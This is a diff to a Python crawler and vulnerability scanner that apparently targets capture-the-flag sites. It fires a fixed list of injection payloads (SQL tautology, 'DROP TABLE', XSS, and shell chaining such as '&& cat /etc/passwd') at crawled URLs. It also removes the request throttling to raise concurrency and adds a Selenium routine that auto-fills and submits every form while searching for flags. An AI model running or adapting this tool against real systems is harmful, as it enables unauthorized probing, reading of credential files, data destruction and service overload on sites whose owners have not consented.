@@ -29,6 +29,7 @@ try:
     from selenium import webdriver
     from selenium.webdriver.chrome.service import Service as ChromeService
     from selenium.webdriver.chrome.options import Options
+    from selenium.webdriver.common.by import By
     SELENIUM_AVAILABLE = True
 except ImportError:
     SELENIUM_AVAILABLE = False
@@ -352,56 +353,33 @@ def analyze_query_params(url):
                 f.append(label_entry("Suspicious param value in","query-param detection",f"{p}={v}"))
     return f
 
-class RLAgent:
-    def __init__(self):
-        self.payloads = [
-            "' OR '1'='1",
-            "<script>alert(1)</script>",
-            "; ls;",
-            "&& cat /etc/passwd",
-            "<img src=x onerror=alert(2)>",
-            "'; DROP TABLE users; --",
-            "|| ping -c 4 127.0.0.1 ||"
-        ]
-        self.q_table = {p:0.0 for p in self.payloads}
-        self.alpha = 0.5
-        self.gamma = 0.9
-        self.num_steps = 7
-    def select_action(self):
-        if random.random() < 0.3:
-            return random.choice(self.payloads)
-        return max(self.payloads, key=lambda x: self.q_table[x])
-    def update(self,action,reward):
-        current_q = self.q_table[action]
-        best_next = max(self.q_table.values())
-        td_target = reward + self.gamma*best_next
-        self.q_table[action] = current_q + self.alpha*(td_target-current_q)
-
-def fuzz_injection_tests(url, agent):
-    results = []
-    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
-        future_map = {}
-        for _ in range(agent.num_steps):
-            p = agent.select_action()
+def fuzz_injection_tests(url):
+    fs = []
+    pl = [
+        "' OR '1'='1",
+        "<script>alert(1)</script>",
+        "; ls;",
+        "&& cat /etc/passwd",
+        "<img src=x onerror=alert(2)>",
+        "'; DROP TABLE users; --",
+        "|| ping -c 4 127.0.0.1 ||"
+    ]
+    for p in pl:
+        # Removed long random sleep to increase concurrency
+        # time.sleep(random.uniform(1.2,2.5))
+        try:
             tu = f"{url}?inj={urllib.parse.quote(p)}"
-            fut = ex.submit(requests.get,tu,timeout=3,headers=CUSTOM_HEADERS)
-            future_map[fut] = p
-        for fut in concurrent.futures.as_completed(future_map):
-            p = future_map[fut]
-            try:
-                r = fut.result()
-                fs = scan_for_vuln_patterns(r.text)
-                reward = 1.0 if fs else 0.0
-                agent.update(p,reward)
-                results.extend(fs)
-            except:
-                pass
-    return results
+            r = requests.get(tu,timeout=3,headers=CUSTOM_HEADERS)
+            fs.extend(scan_for_vuln_patterns(r.text))
+        except:
+            pass
+    return fs
 
 def repeated_disruption_test(url,attempts=3):
     f = []
     for _ in range(attempts):
-        time.sleep(random.uniform(1.0,2.0))
+        # Removed long random sleep to increase concurrency
+        # time.sleep(random.uniform(1.0,2.0))
         try:
             r = requests.get(url,timeout=3,headers=CUSTOM_HEADERS)
             if r.status_code>=500:
@@ -420,12 +398,13 @@ def extract_js_functions(ht):
             d.append(mm.strip())
     return d
 
-def scan_target(url, agent):
+def scan_target(url):
     ds = analyze_query_params(url)
-    ds.extend(fuzz_injection_tests(url,agent))
+    ds.extend(fuzz_injection_tests(url))
     ds.extend(repeated_disruption_test(url))
     try:
-        time.sleep(random.uniform(1.5,3.0))
+        # Removed longer random sleep to increase concurrency
+        # time.sleep(random.uniform(1.5,3.0))
         r = requests.get(url,timeout=5,headers=CUSTOM_HEADERS)
         b = r.text[:MAX_BODY_SNIPPET_LEN]
         p_tags = scan_for_vuln_patterns(b)
@@ -540,21 +519,47 @@ def extract_links_from_html(url,html_text):
 
 def scan_with_chromedriver(url):
     if not SELENIUM_AVAILABLE:
-        return {"url":url,"error":"Selenium not available","data":""}
+        return {"url":url,"error":"Selenium not available","data":"","found_flags":[]}
     try:
-        time.sleep(random.uniform(1.0,2.0))
+        # Removed longer random sleep to increase concurrency
+        # time.sleep(random.uniform(1.0,2.0))
         o = Options()
         o.add_argument("--headless=new")
         o.binary_location = "chrome/Google Chrome for Testing.app"
         s = ChromeService("chromedriver")
         d = webdriver.Chrome(service=s,options=o)
         d.get(url)
+        found_flags = []
+        try:
+            forms = d.find_elements(By.TAG_NAME, "form")
+            for form in forms:
+                inputs = form.find_elements(By.TAG_NAME, "input")
+                for inp in inputs:
+                    try:
+                        inp.send_keys("CTF_INJECTION_PAYLOAD")
+                    except:
+                        pass
+                try:
+                    # time.sleep(1.5) # commented out to increase concurrency
+                    form.submit()
+                    # time.sleep(1)   # commented out to increase concurrency
+                    page_source_after_submit = d.page_source
+                    matches = re.findall(r"(CTF\{.*?\})", page_source_after_submit, re.IGNORECASE)
+                    if matches:
+                        found_flags.extend(matches)
+                except:
+                    pass
+        except:
+            pass
         c = d.page_source
+        matches_global = re.findall(r"(CTF\{.*?\})", c, re.IGNORECASE)
+        if matches_global:
+            found_flags.extend(matches_global)
         d.quit()
-        return {"url":url,"error":"","data":c}
+        return {"url":url,"error":"","data":c,"found_flags":list(set(found_flags))}
     except Exception as e:
         error_details = traceback.format_exc()
-        return {"url":url,"error":f"{str(e)}\nTraceback:\n{error_details}","data":""}
+        return {"url":url,"error":f"{str(e)}\nTraceback:\n{error_details}","data":"","found_flags":[]}
 
 def priority_bfs_crawl_and_scan(starts,max_depth=20):
     visited = set()
@@ -566,18 +571,22 @@ def priority_bfs_crawl_and_scan(starts,max_depth=20):
         depth_map[s] = 0
         G.add_node(s,depth=0)
     results = []
+    # Increased bot_executor max_workers from 10 to 50
     http_executor = concurrent.futures.ThreadPoolExecutor(max_workers=50)
-    bot_executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
-    agent = RLAgent()
+    bot_executor = concurrent.futures.ThreadPoolExecutor(max_workers=50)
     while q:
         d,u = heapq.heappop(q)
+        print(f"PriorityBFS Depth: {d}")
+        print(f"Full URL: {u}")
+        print("Details: scanning target, scanning with chromedriver, extracting links.")
         if u in visited:
             continue
         if d>max_depth:
             break
         visited.add(u)
-        time.sleep(random.uniform(0.3,0.8))
-        f1 = http_executor.submit(scan_target,u,agent)
+        # Removed or commented out random sleep to allow faster concurrency
+        # time.sleep(random.uniform(0.3,0.8))
+        f1 = http_executor.submit(scan_target,u)
         f2 = bot_executor.submit(scan_with_chromedriver,u)
         r1 = f1.result()
         r2 = f2.result()
@@ -614,7 +623,8 @@ def priority_bfs_crawl_and_scan(starts,max_depth=20):
             "reason":r1.get("reason","N/A"),
             "error":r1.get("error","") or r2.get("error",""),
             "matched_details":combined_details,
-            "extracted_js_functions":combined_js
+            "extracted_js_functions":combined_js,
+            "found_flags": r2.get("found_flags",[])
         }
         results.append(final)
     http_executor.shutdown()
@@ -647,6 +657,10 @@ def main():
             print("  Extracted JS Functions:")
             for f_ in r["extracted_js_functions"]:
                 print(f"    {f_}")
+        if r.get("found_flags"):
+            print("  Found Flags:")
+            for flg in r["found_flags"]:
+                print(f"    {flg}")
     write_scan_results_text(all_results,"scan_results.txt")
     write_scan_results_json(all_results)
 
